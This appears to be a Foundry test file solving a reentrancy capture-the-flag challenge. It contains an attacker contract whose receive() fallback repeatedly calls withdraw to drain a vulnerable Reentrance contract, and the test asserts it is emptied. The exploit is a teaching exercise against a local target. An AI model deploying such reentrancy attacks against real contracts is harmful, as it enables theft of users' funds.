// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Reentrance.sol";

contract Reentrant {
    Reentrance public reentrance;
    uint8 counter;

    constructor(address payable prey) {
        reentrance = Reentrance(prey);
    }

    function attack() public {
        reentrance.donate{value: 1 ether}(address(this));
        reentrance.withdraw(1 ether);
    }

    receive() external payable {
        reentrance.withdraw(1 ether);
    }
}

contract ReentranceTest is Test {
    Reentrance reentrance;
    address alice = makeAddr("alice");

    function setUp() public {
        vm.deal(alice, 1 ether);
        reentrance = new Reentrance();
        vm.deal(address(reentrance), 3 ether);
    }

    function test() public {
        assertEq(address(reentrance).balance, 3 ether);

        Reentrant reentrant = new Reentrant(payable(address(reentrance)));
        vm.deal(address(reentrant), 1 ether);
        reentrant.attack();

        assertEq(address(reentrance).balance, 0 ether);
        assertEq(address(reentrant).balance, 4 ether);
    }
}
